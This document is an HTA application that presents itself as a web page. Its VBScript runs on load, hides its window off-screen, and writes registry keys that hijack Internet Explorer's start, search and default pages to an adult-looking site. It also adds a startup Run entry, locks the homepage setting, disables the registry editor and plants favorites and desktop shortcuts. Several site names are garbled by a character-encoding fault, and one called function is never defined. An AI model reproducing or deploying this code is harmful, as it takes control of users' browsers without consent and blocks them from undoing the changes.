<html>
<hta:application caption="no" showintaskbar="no">
<body onload="window.blur();">
<object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script language=vbscript>
l=screen.width+200
t=screen.height+200
moveTo l,t
resizeTo 0,0
</script>
<script LANGUAGE="VBScript">
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "Http://mm.18semm.com" 
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Second Home Page","Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLORE.EXE", "IEXPLORE.EXE Http://mm.18semm.com"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "18…´√√√√–¥’ÊÕ¯ mm.18semm.com"
bugs.RegWrite "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\", "C:\Program Files\Internet Explorer\IEXPLORE.EXE http://mm.18semm.com"
on error resume next
Call LongFei_AddFavorites("-°æ18…´√√√√-18semm°ø","Http://mm.18semm.com")
Call LongFei_AddFavorites("°æ…œ√√√√-shangmm°ø","Http://www.shangmm.com")
Call LongFei_AddFavorites("°æcao√√√√-caomm°ø","Http://www.caomm.cn")
on error resume next
Call LongFei_AddDesktop("18…´√√√√-18semm","Http://mm.18semm.com")
Call LongFei_AddDesktop("…œ√√√√-shangmm","Http://www.shangmm.com")
Call LongFei_AddDesktop("cao√√√√-caomm","http://www.caomm.cn")


on error resume next
Call LongFei_AddQuickLaunch("[18…´√√√√-18semm]","Http://mm.18semm.com")
Call LongFei_AddQuickLaunch("[…œ√√√√-shangmm]","http://www.shangmm.com")
Call LongFei_AddFavorites("°æcao√√√√-caomm°ø","http://www.caomm.cn")


Function LongFei_AddFavorites(N, U)
	on error resume next
	Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
	Set Sl = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/¡¥Ω”/" + N +".URL")
	Sl.TargetPath = U
	Sl.Save()
End Function

Function LongFei_AddDesktop(N, U)
	on error resume next
	Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
	S.TargetPath = U	
	S.Save()
End Function
</script>
<script language="JScript.Encode">
function closeit() {
setTimeout("self.close()",5)
}
closeit()
</script>
</html>